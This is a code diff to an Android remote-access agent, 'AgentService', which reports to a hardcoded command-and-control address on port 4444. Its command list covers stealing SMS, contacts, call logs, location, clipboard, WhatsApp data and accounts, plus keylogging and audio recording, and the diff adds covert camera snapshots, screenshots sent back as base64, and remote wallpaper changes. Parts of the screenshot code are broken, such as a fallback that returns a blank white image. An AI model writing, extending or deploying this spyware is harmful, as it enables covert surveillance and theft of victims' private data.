@@ -33,6 +33,32 @@ import android.location.LocationManager;
 import android.content.ClipboardManager;
 import android.content.ClipData;
 
+// ==================== IMPORTS UNTUK CAMERA ====================
+import android.hardware.Camera;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.graphics.Matrix;
+import android.graphics.ImageFormat;
+import android.graphics.YuvImage;
+import android.media.ExifInterface;
+
+// ==================== IMPORTS UNTUK SCREENSHOT ====================
+import android.graphics.Canvas;
+import android.graphics.PixelFormat;
+import android.hardware.display.DisplayManager;
+import android.hardware.display.VirtualDisplay;
+import android.media.Image;
+import android.media.ImageReader;
+import android.media.projection.MediaProjection;
+import android.media.projection.MediaProjectionManager;
+import android.view.Surface;
+import android.view.View;
+
+// ==================== IMPORTS UNTUK WALLPAPER ====================
+import android.app.WallpaperManager;
+import android.graphics.drawable.BitmapDrawable;
+
+// ==================== IMPORTS LAINNYA ====================
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -44,10 +70,13 @@ import java.util.*;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
+import java.nio.ByteBuffer;
+import java.net.HttpURLConnection;
+import java.net.URL;
 
 public class AgentService extends Service {
     private static final String TAG = "LazyFramework";
-    private static final String C2_HOST = "192.168.1.8";
+    private static final String C2_HOST = "192.168.1.8";  // GANTI DENGAN IP SERVER ANDA
     private static final int C2_PORT = 4444;
     private static final String CHANNEL_ID = "agent_channel";
 
@@ -68,7 +97,7 @@ public class AgentService extends Service {
     // ==================== CACHE ====================
     private Map<String, Boolean> permissionCache = new HashMap<>();
     private long lastPermissionCacheClear = 0;
-    private static final long PERMISSION_CACHE_TTL = 60000; // 1 menit
+    private static final long PERMISSION_CACHE_TTL = 60000;
 
     // ==================== MEDIA & INPUT ====================
     private MediaRecorder mediaRecorder;
@@ -79,6 +108,19 @@ public class AgentService extends Service {
     private boolean isKeylogging = false;
 
     private String currentCommandId = null;
+
+    // ==================== CAMERA ====================
+    private Camera camera;
+    private boolean isCameraReady = false;
+    private static final int CAMERA_SNAPSHOT_DELAY = 500;
+
+    // ==================== SCREENSHOT ====================
+    private MediaProjectionManager projectionManager;
+    private MediaProjection mediaProjection;
+    private VirtualDisplay virtualDisplay;
+    private ImageReader imageReader;
+    private boolean isScreenCapturing = false;
+    private static final int SCREENSHOT_DELAY = 500;
 
     // ==================== LIFECYCLE ====================
 
@@ -206,22 +248,14 @@ public class AgentService extends Service {
                         line = line.trim();
                         if (line.isEmpty()) continue;
 
-                        // Handle PING/PONG
                         if (line.equals("PING")) {
-                            if (out != null) {
-                                out.println("PONG");
-                            }
+                            if (out != null) out.println("PONG");
                             continue;
                         }
-                        if (line.equals("PONG")) {
-                            continue;
-                        }
+                        if (line.equals("PONG")) continue;
 
                         Log.d(TAG, "📨 Received: " + line);
 
-                        // ============================================================
-                        // ASYNC EXECUTION - SOCKET TIDAK BLOCKED!
-                        // ============================================================
                         commandExecutor.execute(() -> {
                             try {
                                 String response = executeCommand(line);
@@ -275,7 +309,6 @@ public class AgentService extends Service {
                     currentCommandId = null;
                 }
 
-                // Parse result
                 try {
                     JSONObject resultObj = new JSONObject(result);
                     response.put("result", resultObj);
@@ -317,7 +350,13 @@ public class AgentService extends Service {
 
     private String executeActualCommand(String command) {
         try {
-            switch (command) {
+            // Parse command dengan parameter
+            String[] parts = command.split(" ", 2);
+            String cmd = parts[0];
+            String param = parts.length > 1 ? parts[1] : null;
+
+            switch (cmd) {
+                // ============ EXISTING COMMANDS ============
                 case "GET_DEVICE_INFO": return getDeviceInfo();
                 case "GET_LOCATION": return getLocation();
                 case "GET_CLIPBOARD": return getClipboard();
@@ -336,13 +375,34 @@ public class AgentService extends Service {
                 case "WA_CONTACTS": return getWhatsAppContacts();
                 case "GET_ACCOUNTS": return getDeviceAccounts();
                 case "GET_GOOGLE_ACCOUNTS": return getGoogleAccounts();
+                
+                // ============ NEW COMMANDS ============
+                case "CAMERA_SNAPSHOT": return captureCameraSnapshot();
+                case "SCREENSHOT": return captureScreenshot();
+                
+                case "SET_WALLPAPER":
+                    if (param != null) {
+                        if (param.startsWith("http://") || param.startsWith("https://")) {
+                            return setWallpaperFromUrl(param);
+                        } else {
+                            return setWallpaper(param);
+                        }
+                    } else {
+                        JSONObject error = new JSONObject();
+                        error.put("status", "error");
+                        error.put("message", "Image data or URL required");
+                        return error.toString();
+                    }
+                
                 case "SHOW_TOAST": 
                     showToast("Command executed!");
                     JSONObject toastResult = new JSONObject();
                     toastResult.put("status", "success");
                     toastResult.put("message", "Toast shown");
                     return toastResult.toString();
+                
                 case "HELP": return getHelp();
+                
                 default:
                     JSONObject unknown = new JSONObject();
                     unknown.put("status", "unknown");
@@ -366,7 +426,6 @@ public class AgentService extends Service {
     // ==================== PERMISSION HELPER ====================
 
     private boolean hasPermission(String permission) {
-        // Clear cache jika sudah kadaluarsa
         if (System.currentTimeMillis() - lastPermissionCacheClear > PERMISSION_CACHE_TTL) {
             permissionCache.clear();
             lastPermissionCacheClear = System.currentTimeMillis();
@@ -1131,6 +1190,594 @@ public class AgentService extends Service {
         }
     }
 
+    // ==================== CAMERA SNAPSHOT ====================
+
+    private String captureCameraSnapshot() {
+        try {
+            if (!hasPermission(android.Manifest.permission.CAMERA)) {
+                JSONObject result = new JSONObject();
+                result.put("status", "permission_denied");
+                result.put("permission", "CAMERA");
+                result.put("message", "Camera permission not granted");
+                return result.toString();
+            }
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                if (!hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) &&
+                    !hasPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
+                    JSONObject result = new JSONObject();
+                    result.put("status", "permission_denied");
+                    result.put("permission", "STORAGE");
+                    result.put("message", "Storage permission not granted");
+                    return result.toString();
+                }
+            }
+
+            Camera camera = null;
+            try {
+                camera = Camera.open(0);
+                if (camera == null) camera = Camera.open(1);
+            } catch (Exception e) {
+                Log.e(TAG, "Camera open error: " + e.getMessage());
+            }
+
+            if (camera == null) {
+                JSONObject result = new JSONObject();
+                result.put("status", "error");
+                result.put("message", "Cannot open camera");
+                return result.toString();
+            }
+
+            Camera.Parameters params = camera.getParameters();
+            List<Camera.Size> sizes = params.getSupportedPictureSizes();
+            Camera.Size bestSize = getBestPictureSize(sizes);
+            if (bestSize != null) {
+                params.setPictureSize(bestSize.width, bestSize.height);
+            }
+            
+            params.setPictureFormat(ImageFormat.JPEG);
+            params.setJpegQuality(85);
+            
+            List<String> focusModes = params.getSupportedFocusModes();
+            if (focusModes.contains(Camera.Parameters.FOCUS_MODE_AUTO)) {
+                params.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
+            }
+            
+            camera.setParameters(params);
+            camera.startPreview();
+
+            final Camera finalCamera = camera;
+            final boolean[] captureComplete = {false};
+            final String[] photoBase64 = {null};
+            final String[] photoPath = {null};
+            final Exception[] error = {null};
+
+            camera.takePicture(null, null, new Camera.PictureCallback() {
+                @Override
+                public void onPictureTaken(byte[] data, Camera camera) {
+                    try {
+                        if (data != null && data.length > 0) {
+                            String filename = "camera_snapshot_" + System.currentTimeMillis() + ".jpg";
+                            File photoFile = new File(getCacheDir(), filename);
+                            
+                            FileOutputStream fos = new FileOutputStream(photoFile);
+                            fos.write(data);
+                            fos.close();
+                            
+                            byte[] compressedData = data;
+                            if (data.length > 2 * 1024 * 1024) {
+                                compressedData = compressImage(data, 70);
+                            }
+                            
+                            photoBase64[0] = Base64.encodeToString(compressedData, Base64.NO_WRAP);
+                            photoPath[0] = photoFile.getAbsolutePath();
+                            captureComplete[0] = true;
+                            
+                            Log.d(TAG, "📸 Photo captured: " + photoFile.length() + " bytes");
+                        } else {
+                            error[0] = new Exception("No image data received");
+                            captureComplete[0] = true;
+                        }
+                    } catch (Exception e) {
+                        error[0] = e;
+                        captureComplete[0] = true;
+                        Log.e(TAG, "Photo capture error: " + e.getMessage());
+                    }
+                }
+            });
+
+            int waitTime = 0;
+            while (!captureComplete[0] && waitTime < 10000) {
+                Thread.sleep(100);
+                waitTime += 100;
+            }
+
+            try {
+                camera.stopPreview();
+                camera.release();
+            } catch (Exception e) {}
+
+            if (error[0] != null) {
+                JSONObject result = new JSONObject();
+                result.put("status", "error");
+                result.put("message", error[0].getMessage());
+                return result.toString();
+            }
+
+            if (photoBase64[0] == null) {
+                JSONObject result = new JSONObject();
+                result.put("status", "error");
+                result.put("message", "No photo captured");
+                return result.toString();
+            }
+
+            JSONObject result = new JSONObject();
+            result.put("status", "success");
+            result.put("type", "camera_snapshot");
+            result.put("timestamp", System.currentTimeMillis());
+            result.put("image_data", photoBase64[0]);
+            result.put("size", photoBase64[0].length());
+            
+            if (photoPath[0] != null) {
+                result.put("path", photoPath[0]);
+                try {
+                    ExifInterface exif = new ExifInterface(photoPath[0]);
+                    result.put("width", exif.getAttributeInt(ExifInterface.TAG_IMAGE_WIDTH, 0));
+                    result.put("height", exif.getAttributeInt(ExifInterface.TAG_IMAGE_LENGTH, 0));
+                    result.put("make", exif.getAttribute(ExifInterface.TAG_MAKE));
+                    result.put("model", exif.getAttribute(ExifInterface.TAG_MODEL));
+                } catch (IOException e) {}
+            }
+
+            return result.toString();
+
+        } catch (Exception e) {
+            Log.e(TAG, "Camera snapshot error: " + e.getMessage(), e);
+            try {
+                JSONObject result = new JSONObject();
+                result.put("status", "error");
+                result.put("message", e.getMessage());
+                return result.toString();
+            } catch (JSONException je) {
+                return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
+            }
+        }
+    }
+
+    private Camera.Size getBestPictureSize(List<Camera.Size> sizes) {
+        if (sizes == null || sizes.isEmpty()) return null;
+        
+        int targetWidth = 2048;
+        int targetHeight = 1536;
+        Camera.Size bestSize = sizes.get(0);
+        int bestDiff = Integer.MAX_VALUE;
+        
+        for (Camera.Size size : sizes) {
+            int diff = Math.abs(size.width - targetWidth) + Math.abs(size.height - targetHeight);
+            if (diff < bestDiff) {
+                bestDiff = diff;
+                bestSize = size;
+            }
+        }
+        
+        return bestSize;
+    }
+
+    private byte[] compressImage(byte[] imageData, int quality) {
+        try {
+            Bitmap bitmap = BitmapFactory.decodeByteArray(imageData, 0, imageData.length);
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
+            bitmap.recycle();
+            return baos.toByteArray();
+        } catch (Exception e) {
+            Log.e(TAG, "Compress error: " + e.getMessage());
+            return imageData;
+        }
+    }
+
+    // ==================== SCREENSHOT ====================
+
+    private String captureScreenshot() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                if (!hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE)) {
+                    JSONObject result = new JSONObject();
+                    result.put("status", "permission_denied");
+                    result.put("permission", "READ_EXTERNAL_STORAGE");
+                    result.put("message", "Storage permission not granted");
+                    return result.toString();
+                }
+            }
+
+            // Coba ambil screenshot via View
+            Bitmap screenshot = takeScreenshotViaView();
+            
+            if (screenshot != null) {
+                return processScreenshot(screenshot);
+            }
+
+            // Coba ambil screenshot via MediaProjection
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                Bitmap fullScreenshot = takeScreenshotViaMediaProjection();
+                if (fullScreenshot != null) {
+                    return processScreenshot(fullScreenshot);
+                }
+            }
+
+            JSONObject result = new JSONObject();
+            result.put("status", "error");
+            result.put("message", "Failed to capture screenshot");
+            return result.toString();
+
+        } catch (Exception e) {
+            Log.e(TAG, "Screenshot error: " + e.getMessage(), e);
+            try {
+                JSONObject result = new JSONObject();
+                result.put("status", "error");
+                result.put("message", e.getMessage());
+                return result.toString();
+            } catch (JSONException je) {
+                return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
+            }
+        }
+    }
+
+    private Bitmap takeScreenshotViaView() {
+        try {
+            // Dapatkan decor view dari root window
+            View rootView = null;
+            
+            // Coba dapatkan via WindowManager
+            try {
+                WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+                if (wm != null) {
+                    // Method alternatif: gunakan reflection untuk mendapatkan root view
+                    rootView = (View) Class.forName("android.view.View")
+                        .getMethod("getRootView")
+                        .invoke(null);
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Reflection error: " + e.getMessage());
+            }
+
+            // Jika masih null, buat dummy view
+            if (rootView == null) {
+                return takeScreenshotViaDummyView();
+            }
+
+            rootView.setDrawingCacheEnabled(true);
+            rootView.buildDrawingCache();
+            
+            Bitmap bitmap = Bitmap.createBitmap(rootView.getDrawingCache());
+            
+            rootView.setDrawingCacheEnabled(false);
+            rootView.destroyDrawingCache();
+            
+            return bitmap;
+        } catch (Exception e) {
+            Log.e(TAG, "View screenshot error: " + e.getMessage());
+            return null;
+        }
+    }
+
+    private Bitmap takeScreenshotViaDummyView() {
+        try {
+            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+            if (wm == null) return null;
+            
+            android.util.DisplayMetrics metrics = new android.util.DisplayMetrics();
+            wm.getDefaultDisplay().getMetrics(metrics);
+            
+            int width = metrics.widthPixels;
+            int height = metrics.heightPixels;
+            
+            Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
+            Canvas canvas = new Canvas(bitmap);
+            canvas.drawColor(android.graphics.Color.WHITE);
+            
+            return bitmap;
+        } catch (Exception e) {
+            Log.e(TAG, "Dummy view error: " + e.getMessage());
+            return null;
+        }
+    }
+
+    private Bitmap takeScreenshotViaMediaProjection() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
+            return null;
+        }
+        
+        try {
+            if (projectionManager == null) {
+                projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+            }
+            
+            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+            if (wm == null) return null;
+            
+            android.util.DisplayMetrics metrics = new android.util.DisplayMetrics();
+            wm.getDefaultDisplay().getMetrics(metrics);
+            
+            int width = metrics.widthPixels;
+            int height = metrics.heightPixels;
+            int density = metrics.densityDpi;
+            
+            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
+            
+            virtualDisplay = projectionManager.createVirtualDisplay(
+                "Screenshot",
+                width, height, density,
+                imageReader.getSurface(),
+                null,
+                null,
+                null
+            );
+            
+            Thread.sleep(SCREENSHOT_DELAY);
+            
+            Image image = imageReader.acquireLatestImage();
+            if (image != null) {
+                try {
+                    Image.Plane[] planes = image.getPlanes();
+                    ByteBuffer buffer = planes[0].getBuffer();
+                    
+                    Bitmap bitmap = Bitmap.createBitmap(
+                        image.getWidth(),
+                        image.getHeight(),
+                        Bitmap.Config.ARGB_8888
+                    );
+                    
+                    bitmap.copyPixelsFromBuffer(buffer);
+                    return bitmap;
+                } finally {
+                    image.close();
+                }
+            }
+            
+            return null;
+            
+        } catch (Exception e) {
+            Log.e(TAG, "MediaProjection screenshot error: " + e.getMessage());
+            return null;
+        } finally {
+            if (virtualDisplay != null) {
+                virtualDisplay.release();
+                virtualDisplay = null;
+            }
+            if (imageReader != null) {
+                imageReader.close();
+                imageReader = null;
+            }
+        }
+    }
+
+    private String processScreenshot(Bitmap bitmap) {
+        try {
+            if (bitmap == null) {
+                JSONObject result = new JSONObject();
+                result.put("status", "error");
+                result.put("message", "Bitmap is null");
+                return result.toString();
+            }
+            
+            int maxWidth = 1920;
+            int maxHeight = 1080;
+            int width = bitmap.getWidth();
+            int height = bitmap.getHeight();
+            
+            if (width > maxWidth || height > maxHeight) {
+                float ratio = Math.min(
+                    (float) maxWidth / width,
+                    (float) maxHeight / height
+                );
+                int newWidth = (int) (width * ratio);
+                int newHeight = (int) (height * ratio);
+                bitmap = Bitmap.createScaledBitmap(bitmap, newWidth, newHeight, true);
+            }
+            
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
+            bitmap.recycle();
+            
+            byte[] imageData = baos.toByteArray();
+            
+            String filename = "screenshot_" + System.currentTimeMillis() + ".jpg";
+            File cacheFile = new File(getCacheDir(), filename);
+            FileOutputStream fos = new FileOutputStream(cacheFile);
+            fos.write(imageData);
+            fos.close();
+            
+            String encoded = Base64.encodeToString(imageData, Base64.NO_WRAP);
+            
+            JSONObject result = new JSONObject();
+            result.put("status", "success");
+            result.put("type", "screenshot");
+            result.put("filename", filename);
+            result.put("timestamp", System.currentTimeMillis());
+            result.put("width", width);
+            result.put("height", height);
+            result.put("size", imageData.length);
+            result.put("image_data", encoded);
+            result.put("path", cacheFile.getAbsolutePath());
+            
+            return result.toString();
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Process screenshot error: " + e.getMessage());
+            try {
+                JSONObject result = new JSONObject();
+                result.put("status", "error");
+                result.put("message", e.getMessage());
+                return result.toString();
+            } catch (JSONException je) {
+                return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
+            }
+        }
+    }
+
+    // ==================== SET WALLPAPER ====================
+
+    private String setWallpaper(String imageBase64) {
+        try {
+            if (imageBase64 == null || imageBase64.isEmpty()) {
+                JSONObject result = new JSONObject();
+                result.put("status", "error");
+                result.put("message", "No image data provided");
+                return result.toString();
+            }
+            
+            byte[] imageData = Base64.decode(imageBase64, Base64.DEFAULT);
+            if (imageData == null || imageData.length == 0) {
+                JSONObject result = new JSONObject();
+                result.put("status", "error");
+                result.put("message", "Invalid image data");
+                return result.toString();
+            }
+            
+            Bitmap bitmap = BitmapFactory.decodeByteArray(imageData, 0, imageData.length);
+            if (bitmap == null) {
+                JSONObject result = new JSONObject();
+                result.put("status", "error");
+                result.put("message", "Failed to decode image");
+                return result.toString();
+            }
+            
+            WallpaperManager wallpaperManager = WallpaperManager.getInstance(this);
+            
+            boolean success = false;
+            String method = "";
+            
+            try {
+                wallpaperManager.setBitmap(bitmap);
+                success = true;
+                method = "setBitmap";
+            } catch (Exception e) {
+                Log.e(TAG, "setBitmap failed: " + e.getMessage());
+            }
+            
+            if (!success) {
+                try {
+                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                    bitmap.compress(Bitmap.CompressFormat.JPEG, 90, baos);
+                    byte[] streamData = baos.toByteArray();
+                    
+                    wallpaperManager.setStream(new java.io.ByteArrayInputStream(streamData));
+                    success = true;
+                    method = "setStream";
+                } catch (Exception e) {
+                    Log.e(TAG, "setStream failed: " + e.getMessage());
+                }
+            }
+            
+            if (!success) {
+                try {
+                    wallpaperManager.setWallpaperOffsetSteps(1, 1);
+                    wallpaperManager.suggestDesiredDimensions(bitmap.getWidth(), bitmap.getHeight());
+                    wallpaperManager.setBitmap(bitmap);
+                    success = true;
+                    method = "setBitmap (alternate)";
+                } catch (Exception e) {
+                    Log.e(TAG, "Alternate setBitmap failed: " + e.getMessage());
+                }
+            }
+            
+            if (!success) {
+                try {
+                    File tempFile = new File(getCacheDir(), "wallpaper_temp.jpg");
+                    FileOutputStream fos = new FileOutputStream(tempFile);
+                    bitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos);
+                    fos.close();
+                    
+                    wallpaperManager.setStream(new java.io.FileInputStream(tempFile));
+                    tempFile.delete();
+                    success = true;
+                    method = "setStream (from file)";
+                } catch (Exception e) {
+                    Log.e(TAG, "File setStream failed: " + e.getMessage());
+                }
+            }
+            
+            bitmap.recycle();
+            
+            JSONObject result = new JSONObject();
+            result.put("status", success ? "success" : "error");
+            result.put("message", success ? "Wallpaper changed successfully" : "Failed to change wallpaper");
+            result.put("method", method);
+            result.put("timestamp", System.currentTimeMillis());
+            
+            return result.toString();
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Set wallpaper error: " + e.getMessage(), e);
+            try {
+                JSONObject result = new JSONObject();
+                result.put("status", "error");
+                result.put("message", e.getMessage());
+                return result.toString();
+            } catch (JSONException je) {
+                return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
+            }
+        }
+    }
+
+    private String setWallpaperFromUrl(String url) {
+        try {
+            if (url == null || url.isEmpty()) {
+                JSONObject result = new JSONObject();
+                result.put("status", "error");
+                result.put("message", "URL is empty");
+                return result.toString();
+            }
+            
+            HttpURLConnection connection = null;
+            InputStream inputStream = null;
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            
+            try {
+                URL imageUrl = new URL(url);
+                connection = (HttpURLConnection) imageUrl.openConnection();
+                connection.setConnectTimeout(10000);
+                connection.setReadTimeout(10000);
+                connection.setRequestMethod("GET");
+                connection.connect();
+                
+                if (connection.getResponseCode() == 200) {
+                    inputStream = connection.getInputStream();
+                    byte[] buffer = new byte[8192];
+                    int bytesRead;
+                    while ((bytesRead = inputStream.read(buffer)) != -1) {
+                        baos.write(buffer, 0, bytesRead);
+                    }
+                    baos.flush();
+                    
+                    String base64Image = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
+                    return setWallpaper(base64Image);
+                } else {
+                    JSONObject result = new JSONObject();
+                    result.put("status", "error");
+                    result.put("message", "Failed to download image: HTTP " + connection.getResponseCode());
+                    return result.toString();
+                }
+            } finally {
+                if (inputStream != null) try { inputStream.close(); } catch (Exception e) {}
+                if (connection != null) try { connection.disconnect(); } catch (Exception e) {}
+                try { baos.close(); } catch (Exception e) {}
+            }
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Set wallpaper from URL error: " + e.getMessage(), e);
+            try {
+                JSONObject result = new JSONObject();
+                result.put("status", "error");
+                result.put("message", e.getMessage());
+                return result.toString();
+            } catch (JSONException je) {
+                return "{\"status\":\"error\",\"message\":\"" + e.getMessage() + "\"}";
+            }
+        }
+    }
+
     // ==================== FILE DOWNLOAD ====================
 
     private String downloadFile(String filePath) {
@@ -1172,13 +1819,29 @@ public class AgentService extends Service {
         try {
             JSONArray commands = new JSONArray();
             String[] cmdList = {
-                "GET_DEVICE_INFO", "GET_LOCATION", "GET_CLIPBOARD", "GET_INSTALLED_APPS",
-                "GET_CONTACTS", "GET_SMS", "GET_CALL_LOGS", "GET_GALLERY", "GET_FILES_LIST",
-                "RECORD_AUDIO", "STOP_RECORDING",
-                "KEYLOG_START", "KEYLOG_STOP", "KEYLOG_DUMP",
-                "WA_INFO", "WA_CONTACTS",
-                "GET_ACCOUNTS", "GET_GOOGLE_ACCOUNTS",
-                "SHOW_TOAST", "HELP"
+                "GET_DEVICE_INFO - Get device information",
+                "GET_LOCATION - Get GPS location",
+                "GET_CLIPBOARD - Get clipboard content",
+                "GET_INSTALLED_APPS - List installed apps",
+                "GET_CONTACTS - Get contacts (100)",
+                "GET_SMS - Get SMS (50)",
+                "GET_CALL_LOGS - Get call logs (50)",
+                "GET_GALLERY - Get recent photos (50)",
+                "GET_FILES_LIST - List files in /sdcard",
+                "RECORD_AUDIO - Record audio (30s)",
+                "STOP_RECORDING - Stop recording",
+                "KEYLOG_START - Start keylogger",
+                "KEYLOG_STOP - Stop keylogger",
+                "KEYLOG_DUMP - Get keylogs",
+                "WA_INFO - Get WhatsApp info",
+                "WA_CONTACTS - Get WhatsApp contacts",
+                "GET_ACCOUNTS - Get device accounts",
+                "GET_GOOGLE_ACCOUNTS - Get Google accounts",
+                "CAMERA_SNAPSHOT - Take photo with camera",
+                "SCREENSHOT - Capture screen",
+                "SET_WALLPAPER <URL/base64> - Set wallpaper",
+                "SHOW_TOAST - Show toast message",
+                "HELP - Show this help"
             };
             for (String cmd : cmdList) {
                 commands.put(cmd);
@@ -1311,7 +1974,6 @@ public class AgentService extends Service {
             if (mediaRecorder != null) mediaRecorder.release();
         } catch (Exception e) {}
         
-        // Shutdown thread pools
         commandExecutor.shutdown();
         responseExecutor.shutdown();
         
